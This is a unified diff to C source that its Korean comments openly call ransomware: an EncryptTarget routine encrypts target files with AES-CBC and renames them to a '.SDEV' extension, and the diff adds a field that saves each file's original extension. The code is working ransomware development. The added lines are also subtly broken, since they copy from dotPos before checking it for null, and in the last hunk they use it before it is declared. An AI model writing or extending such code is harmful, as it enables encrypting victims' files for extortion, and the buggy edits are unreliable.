@@ -14,6 +14,7 @@
 typedef struct Directorytarget {
     wchar_t addr[1000]; // 파일 경로 주소
     wchar_t file[1000]; //랜섬웨어 타겟으로 설정할 파일
+    wchar_t oex[1000];  //원래 파일의 확장자를 저장하는 멤버
 }target;
 
 
@@ -88,6 +89,7 @@ void EncryptTarget(target* t, unsigned char* key) {
                     //path를 핸들링 해서 .SDEV로 바꾸고 그 path1을
 
                     wchar_t* dotPos = wcsrchr(path1, L'.');
+                    wcscpy(t->oex,dotPos);
                     if (dotPos) {
                         // Replace the file extension with ".SDEV"
                         wcscpy(dotPos, L".SDEV");
@@ -138,6 +140,7 @@ void EncryptTarget(target* t, unsigned char* key) {
                     //path를 핸들링 해서 .SDEV로 바꾸고 그 path1을
 
                     wchar_t* dotPos = wcsrchr(path1, L'.');
+                    wcscpy(t->oex,dotPos);
                     if (dotPos) {
                         // Replace the file extension with ".SDEV"
                         wcscpy(dotPos, L".SDEV");
@@ -182,6 +185,7 @@ void EncryptTarget(target* t, unsigned char* key) {
                     AES_CBC_encrypt_buffer(&ctx, in, bytesRead);
 
                     wcscpy(path1, t->file);
+                    wcscpy(t->oex,dotPos);
                     //path를 핸들링 해서 .SDEV로 바꾸고 그 path1을
 
                     wchar_t* dotPos = wcsrchr(path1, L'.');
